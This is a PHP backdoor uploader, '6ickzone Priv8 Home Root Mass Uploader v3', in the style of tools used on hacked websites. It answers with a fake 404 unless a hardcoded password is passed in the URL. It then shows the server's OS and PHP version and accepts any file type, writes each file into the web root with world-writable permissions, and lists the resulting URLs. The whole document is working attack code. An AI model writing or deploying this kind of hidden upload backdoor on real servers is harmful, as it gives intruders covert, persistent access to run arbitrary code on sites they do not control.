<?php
// 6ickzone Priv8 Home Root Mass Uploader v3
// Start output buffering to allow setting headers
ob_start();

$auth_pass = "6ickzone";
// Authentication: check password param before any output
if (!isset($_GET['p']) || $_GET['p'] !== $auth_pass) {
    // Send 404 header
    header("HTTP/1.0 404 Not Found");
    exit;
}

// Now safe to output HTML
?><!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Priv8 Home Root Mass Uploader</title>
  <style>
    body { background: #111; color: #e0e0e0; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .card { background: #1e1e1e; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.5); width: 100%; max-width: 500px; }
    h1 { font-size: 1.5rem; margin-bottom: 10px; text-align: center; }
    .info { font-size: 0.9rem; margin-bottom: 15px; background: #2a2a2a; padding: 10px; border-radius: 4px; }
    form { display: flex; flex-direction: column; gap: 10px; }
    input[type="file"] { padding: 5px; }
    input[type="submit"] { padding: 8px; border: none; border-radius: 4px; cursor: pointer; }
    .footer { margin-top: 15px; font-size: 0.8rem; text-align: center; }
    .success, .fail { font-size: 0.8rem; margin-bottom: 5px; }
    .success { color: #6f6; }
    .fail { color: #f66; }
  </style>
</head>
<body>
  <?php
    // Gather server info
    $os = php_uname();
    $phpv = phpversion();
    $uploadedFiles = [];
    $failedFiles = [];if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
    $root = $_SERVER['DOCUMENT_ROOT'];
    foreach ($_FILES['files']['tmp_name'] as $index => $tmpName) {
        if ($_FILES['files']['error'][$index] === UPLOAD_ERR_OK) {
            $origName = basename($_FILES['files']['name'][$index]);
            $ext = pathinfo($origName, PATHINFO_EXTENSION);
            $newName = substr(md5(time() . $index), 0, 6) . "." . $ext;
            $dest = $root . '/' . $newName;
            if (move_uploaded_file($tmpName, $dest)) {
                @chmod($dest, 0777);
                $url = "http://" . $_SERVER['HTTP_HOST'] . "/" . $newName;
                $uploadedFiles[] = $url;
            } else {
                $failedFiles[] = $origName;
            }
        } else {
            $failedFiles[] = $_FILES['files']['name'][$index];
        }
    }
}

?>

  <div class="card">
    <h1>Priv8 Home Root Uploader<br>by <span style="color:#8af">NyxCode x 0x6ick</span></h1>
    <div class="info">
      <strong>Server Info:</strong><br>
      OS: <?php echo htmlspecialchars($os); ?><br>
      PHP v: <?php echo htmlspecialchars($phpv); ?>
    </div><?php if (!empty($uploadedFiles)): ?>
  <div class="info">
    <strong>Uploaded Files:</strong><br>
    <?php foreach ($uploadedFiles as $file): ?>
      <div class="success"><a href="<?php echo $file; ?>" target="_blank"><?php echo $file; ?></a></div>
    <?php endforeach; ?>
  </div>
<?php endif; ?>

<?php if (!empty($failedFiles)): ?>
  <div class="info">
    <strong>Failed Files:</strong><br>
    <?php foreach ($failedFiles as $file): ?>
      <div class="fail"><?php echo htmlspecialchars($file); ?></div>
    <?php endforeach; ?>
  </div>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
  <input type="file" name="files[]" multiple required>
  <input type="submit" value="Mass Upload">
</form>

<div class="footer">
  Version: v3 (mass uploader mode)
</div>

  </div>
</body>
</html>
<?php ob_end_flush(); ?>
